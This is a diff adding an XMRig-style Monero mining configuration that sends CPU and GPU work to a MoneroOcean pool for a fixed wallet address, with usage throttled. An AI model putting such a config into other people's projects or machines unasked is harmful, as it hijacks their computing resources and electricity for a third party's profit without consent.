@@ -1,0 +1,34 @@
+{
+    "pools": [
+        {
+            "url": "gulf.moneroocean.stream:80",
+            "user": "49qHygW7jKGiPDGwb16zepfzaCWrjwyUoC5CZyV6ezjP4FdWEgRJ1C4jF6yEpjFUSXLgmVNWqt6CqigH3qRVUq1iRkYuXQ3",
+            "pass": "xmrig",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    "cpu": {
+        "enabled": true,
+        "priority": 1,
+        "max-threads-hint": 75,
+        "yield": true,
+        "memory-pool": true,
+        "affinity": "all",
+        "rx": [1, 3, 5, 7, 9, 11]
+    },
+    "opencl": {
+        "enabled": true,
+        "intensity": 50,
+        "max-gpu-usage": 60,
+        "threads": 1
+    },
+    "cuda": {
+        "enabled": true, 
+        "intensity": 50,
+        "max-gpu-usage": 60,
+        "threads": 1
+    },
+    "print-time": 60,
+    "autosave": false
+}
